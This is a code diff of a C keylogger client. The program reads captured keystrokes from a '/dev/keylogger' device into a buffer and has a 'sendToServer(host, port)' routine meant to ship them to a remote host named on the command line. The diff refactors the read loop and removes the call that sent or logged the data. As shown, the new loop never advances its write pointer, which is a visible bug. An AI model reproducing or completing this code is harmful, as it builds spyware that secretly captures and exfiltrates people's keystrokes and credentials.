@@ -4,10 +4,11 @@
 #include <fcntl.h>
 #include <sys/select.h>
 
-#define BUFFER_LEN 1024
+#define BUFSIZE 128
 
-char buffer[BUFFER_LEN];
+char buffer[BUFSIZE];
 int currentSize = 0;
+char* currentPos = buffer;
 
 int sendToServer(char *host, int port)
 {
@@ -23,6 +24,8 @@ void logToFile()
     fclose(file);
 }
 
+int dev_fd;
+
 int main(int argc, char *argv[])
 {
     if (argc != 3)
@@ -34,30 +37,26 @@ int main(int argc, char *argv[])
     char *host = argv[1];
     int port = atoi(argv[2]);
 
-    int dev;
-    if ((dev = open("/dev/keylogger", O_RDONLY)) == -1)
+    if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1)
     {
 		perror("open");
 		fprintf(stderr, "Cannot open device\n");
         exit(2);
     }
 
-    int readBytes;
     while (1)
     {
-        if ((readBytes = read(dev, buffer + currentSize, BUFFER_LEN - currentSize)) == -1)
+        int readBytes;
+        if ((readBytes = read(dev_fd, currentPos, BUFSIZE - currentSize)) == -1)
         {
             fprintf(stderr, "Error reading device\n");
-            close(dev);
+            close(dev_fd);
             exit(3);
         }
-        printf("Read %d bytes\n", readBytes);
 
         currentSize += readBytes;
-        if (currentSize == BUFFER_LEN && !sendToServer(host, port) || 1)
-        {
-            logToFile();
-        }
+
+        printf("Read %d bytes\n", readBytes);
 
         sleep(2);
     }
